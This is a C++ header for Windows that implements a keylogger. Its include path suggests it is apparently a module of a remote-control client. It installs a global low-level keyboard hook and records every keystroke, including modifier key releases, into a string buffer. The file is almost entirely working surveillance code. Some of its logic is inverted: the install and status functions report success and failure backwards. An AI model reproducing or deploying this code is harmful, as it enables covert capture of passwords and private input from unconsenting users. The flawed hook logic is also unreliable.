#pragma once
#ifndef KEYHOOK_H
#define KEYHOOK_H

#include <Windows.h>
#include <task\client_tasks\keylogger\key_constrants.h>

namespace keyhook {

	HHOOK eHook = nullptr;
	std::string keylog = {};

	LRESULT keyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
	{
		if (nCode < 0)
			CallNextHookEx(eHook, nCode, wparam, lparam);
		KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
		if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
		{
			keylog += Keys::KEYS[kbs->vkCode].Name;
			if (kbs->vkCode == VK_RETURN)
				keylog += '\n';
		}
		else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
		{
			DWORD key = kbs->vkCode;
			if (key == VK_CONTROL
				|| key == VK_LCONTROL
				|| key == VK_RCONTROL
				|| key == VK_SHIFT
				|| key == VK_LSHIFT
				|| key == VK_RSHIFT
				|| key == VK_MENU
				|| key == VK_LMENU
				|| key == VK_RMENU
				|| key == VK_CAPITAL
				|| key == VK_NUMLOCK
				|| key == VK_LWIN
				|| key == VK_RWIN)
			{
				std::string keyName = Keys::KEYS[kbs->vkCode].Name;
				keyName.insert(1, "/");
				keylog += keyName;
			}
		}
		return CallNextHookEx(eHook, nCode, wparam, lparam);
	}

	bool install_hook()
	{
		eHook = SetWindowsHookEx(
			WH_KEYBOARD_LL, 
			(HOOKPROC)keyboardProc, 
			GetModuleHandle(NULL),
			0
		);
		return eHook == NULL;
	}

	bool uninstall_hook()
	{
		BOOL b = UnhookWindowsHookEx(eHook);
		eHook = NULL;
		return (bool)b;
	}

	bool is_hooked()
	{
		return (bool)(eHook == NULL);
	}

}
#endif